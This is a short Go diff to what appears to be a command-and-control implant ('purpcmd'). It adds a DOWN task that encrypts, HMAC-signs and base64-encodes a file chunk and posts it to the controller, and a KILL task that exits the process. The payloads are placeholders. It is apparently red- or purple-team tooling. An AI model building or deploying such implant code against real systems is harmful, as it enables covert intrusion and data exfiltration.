@@ -5,6 +5,7 @@ import (
 	"encoding/base64"
 	"fmt"
 	"io"
+	"os"
 	"purpcmd/implant/ssh"
 	"purpcmd/internal"
 	"purpcmd/internal/encrypt"
@@ -84,6 +85,18 @@ func Start() {
 		case internal.SSH:
 			print("->",tcode, "calling ssh for ", h.Socket)
 			ssh.Wsclient("aaa","/any.png" , h.Socket)
+		case internal.DOWN:
+			println("\n->",tcode)
+			taskResp := PackChunk(i, "any.txt", []byte("aaa"), tid)
+
+			dataEnc := enc.AESCbcEncrypt(taskResp)
+			enc.HMACPackAddHmac(&dataEnc)
+			taskRestEnc := base64.StdEncoding.EncodeToString(dataEnc)
+			println(taskRestEnc)
+			h.Post([]byte(taskRestEnc))
+		case internal.KILL:
+			println("\n->",tcode)
+			os.Exit(0)
 		default:
 			print("->",tcode, "Nothing")
 		}
